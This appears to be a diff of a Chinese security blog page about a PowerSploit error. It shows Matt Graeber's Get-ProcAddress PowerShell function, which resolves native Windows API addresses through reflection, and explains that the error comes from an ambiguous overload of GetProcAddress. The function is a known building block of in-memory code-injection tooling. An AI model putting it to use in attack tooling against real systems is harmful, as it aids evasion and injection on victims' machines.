-</span></span><span style="display:flex;"><span>	        
-</span></span><span style="display:flex;"><span>	        [Parameter( <span style="color:#a6e22e">Position</span> = <span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">Mandatory</span> = $True )]
-</span></span><span style="display:flex;"><span>	        [<span style="color:#66d9ef">String</span>]
-</span></span><span style="display:flex;"><span>	        $Procedure
-</span></span><span style="display:flex;"><span>	    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	    <span style="color:#75715e"># Get a reference to System.dll in the GAC</span>
-</span></span><span style="display:flex;"><span>	    $SystemAssembly = [<span style="color:#66d9ef">AppDomain</span>]::CurrentDomain.GetAssemblies() |
-</span></span><span style="display:flex;"><span>	        Where-Object { $_.GlobalAssemblyCache <span style="color:#f92672">-And</span> $_.Location.Split(<span style="color:#e6db74">&#39;\\&#39;</span>)[<span style="color:#ae81ff">-1</span>].Equals(<span style="color:#e6db74">&#39;System.dll&#39;</span>) }
-</span></span><span style="display:flex;"><span>	    $UnsafeNativeMethods = $SystemAssembly.GetType(<span style="color:#e6db74">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>)
-</span></span><span style="display:flex;"><span>	    <span style="color:#75715e"># Get a reference to the GetModuleHandle and GetProcAddress methods</span>
-</span></span><span style="display:flex;"><span>	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(<span style="color:#e6db74">&#39;GetModuleHandle&#39;</span>)
-</span></span><span style="display:flex;"><span>		$GetProcAddress = $UnsafeNativeMethods.GetMethod(<span style="color:#e6db74">&#39;GetProcAddress&#39;</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#75715e"># $GetProcAddress = $UnsafeNativeMethods.GetMethod(&#39;GetProcAddress&#39;, [reflection.bindingflags] &#34;Public,Static&#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</span>
-</span></span><span style="display:flex;"><span>	    <span style="color:#75715e"># Get a handle to the module specified</span>
-</span></span><span style="display:flex;"><span>	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
-</span></span><span style="display:flex;"><span>	    $tmpPtr = New-Object IntPtr
-</span></span><span style="display:flex;"><span>	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	    <span style="color:#75715e"># Return the address of the function</span>
-</span></span><span style="display:flex;"><span>	    Write-Output $GetProcAddress.Invoke($null, @([<span style="color:#66d9ef">System.Runtime.InteropServices.HandleRef</span>]$HandleRef, $Procedure))
-</span></span><span style="display:flex;"><span>	}
-</span></span></code></pre></div><p>该行代码由于在执行$UnsafeNativeMethods.GetMethod(&lsquo;GetProcAddress&rsquo;)的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod(&lsquo;GetProcAddress&rsquo;)无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。</p>
-<p>以下是$UnsafeNativeMethods.GetMethod(&lsquo;GetProcAddress&rsquo;)的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。</p>
-<pre tabindex="0"><code>Name                       : GetProcAddress
+</code></pre><ul><li>报错分析：</li></ul><p>报错的第886行代码为<code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code>,它存在如下函数中：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e>#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>Function</span> Get-ProcAddress
+</span></span><span style=display:flex><span>	{
+</span></span><span style=display:flex><span>	    <span style=color:#66d9ef>Param</span>
+</span></span><span style=display:flex><span>	    (
+</span></span><span style=display:flex><span>	        [OutputType([<span style=color:#66d9ef>IntPtr</span>])]
+</span></span><span style=display:flex><span>	    
+</span></span><span style=display:flex><span>	        [Parameter( <span style=color:#a6e22e>Position</span> = <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>Mandatory</span> = $True )]
+</span></span><span style=display:flex><span>	        [<span style=color:#66d9ef>String</span>]
+</span></span><span style=display:flex><span>	        $Module,
+</span></span><span style=display:flex><span>	        
+</span></span><span style=display:flex><span>	        [Parameter( <span style=color:#a6e22e>Position</span> = <span style=color:#ae81ff>1</span>, <span style=color:#a6e22e>Mandatory</span> = $True )]
+</span></span><span style=display:flex><span>	        [<span style=color:#66d9ef>String</span>]
+</span></span><span style=display:flex><span>	        $Procedure
+</span></span><span style=display:flex><span>	    )
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	    <span style=color:#75715e># Get a reference to System.dll in the GAC</span>
+</span></span><span style=display:flex><span>	    $SystemAssembly = [<span style=color:#66d9ef>AppDomain</span>]::CurrentDomain.GetAssemblies() |
+</span></span><span style=display:flex><span>	        Where-Object { $_.GlobalAssemblyCache <span style=color:#f92672>-And</span> $_.Location.Split(<span style=color:#e6db74>&#39;\\&#39;</span>)[<span style=color:#ae81ff>-1</span>].Equals(<span style=color:#e6db74>&#39;System.dll&#39;</span>) }
+</span></span><span style=display:flex><span>	    $UnsafeNativeMethods = $SystemAssembly.GetType(<span style=color:#e6db74>&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>)
+</span></span><span style=display:flex><span>	    <span style=color:#75715e># Get a reference to the GetModuleHandle and GetProcAddress methods</span>
+</span></span><span style=display:flex><span>	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(<span style=color:#e6db74>&#39;GetModuleHandle&#39;</span>)
+</span></span><span style=display:flex><span>		$GetProcAddress = $UnsafeNativeMethods.GetMethod(<span style=color:#e6db74>&#39;GetProcAddress&#39;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#75715e># $GetProcAddress = $UnsafeNativeMethods.GetMethod(&#39;GetProcAddress&#39;, [reflection.bindingflags] &#34;Public,Static&#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);</span>
+</span></span><span style=display:flex><span>	    <span style=color:#75715e># Get a handle to the module specified</span>
+</span></span><span style=display:flex><span>	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+</span></span><span style=display:flex><span>	    $tmpPtr = New-Object IntPtr
+</span></span><span style=display:flex><span>	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	    <span style=color:#75715e># Return the address of the function</span>
+</span></span><span style=display:flex><span>	    Write-Output $GetProcAddress.Invoke($null, @([<span style=color:#66d9ef>System.Runtime.InteropServices.HandleRef</span>]$HandleRef, $Procedure))
+</span></span><span style=display:flex><span>	}
+</span></span></code></pre></div><p>该行代码由于在执行$UnsafeNativeMethods.GetMethod(&lsquo;GetProcAddress&rsquo;)的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod(&lsquo;GetProcAddress&rsquo;)无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。</p><p>以下是$UnsafeNativeMethods.GetMethod(&lsquo;GetProcAddress&rsquo;)的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。</p><pre tabindex=0><code>Name                       : GetProcAddress
 DeclaringType              : Microsoft.Win32.UnsafeNativeMethods
 ReflectedType              : Microsoft.Win32.UnsafeNativeMethods
 MemberType                 : Method
@@ -432,229 +138,12 @@ IsAbstract                 : False
 IsSpecialName              : False
 IsConstructor              : False
 CustomAttributes           : {[System.Runtime.InteropServices.DllImportAttribute(&#34;kernel32.dll&#34;, EntryPoint = &#34;GetProcAddress&#34;, CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
-</code></pre>
-</section>
-
-
-    <footer class="article-footer">
-    
-    <section class="article-tags">
-        
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
-        
-            <a href="/tags/powersploit/">Powersploit</a>
-        
-    </section>
-
-
-    </footer>
-
-
-    
-</article>
-
-    
-
-    
-
-<aside class="related-content--wrapper">
-    <h2 class="section-title">Related content</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/1536409490993.png" loading="lazy" data-key="" data-hash="/images/1536409490993.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Burp suite中的dnslog</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/image1.png" loading="lazy" data-key="" data-hash="/images/image1.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Burp中匹配中文</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/1536460373438.png" loading="lazy" data-key="" data-hash="/images/1536460373438.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">SSH隧道转发</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">curl详解</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
-
-     
-    
-        
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2018 - 
-        
-        2025 runshell
-    </section>
-    
-    <section class="powerby">
-        
-            runshell <br/>
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-
-
-    
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
-            >
-
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
-                
-                >
-            </script><script type="text/javascript" src="/ts/main.3b26d4996b06948d0792fcac8160425612872c44e8ab5bbefcb4e83f1f9cf335.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
+</code></pre></section><footer class=article-footer><section class=article-tags><a href=/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>网络安全</a>
+<a href=/tags/powersploit/>Powersploit</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp-suite%E4%B8%AD%E7%9A%84dnslog/><div class=article-image><img src=/images/1536409490993.png loading=lazy data-key data-hash=/images/1536409490993.png></div><div class=article-details><h2 class=article-title>Burp suite中的dnslog</h2></div></a></article><article class=has-image><a href=/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/burp%E4%B8%AD%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87/><div class=article-image><img src=/images/image1.png loading=lazy data-key data-hash=/images/image1.png></div><div class=article-details><h2 class=article-title>Burp中匹配中文</h2></div></a></article><article class=has-image><a href=/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/><div class=article-image><img src=/images/1536460373438.png loading=lazy data-key data-hash=/images/1536460373438.png></div><div class=article-details><h2 class=article-title>SSH隧道转发</h2></div></a></article><article><a href=/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/><div class=article-details><h2 class=article-title>curl详解</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2018 -
+2025 runshell</section><section class=powerby>runshell<br>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
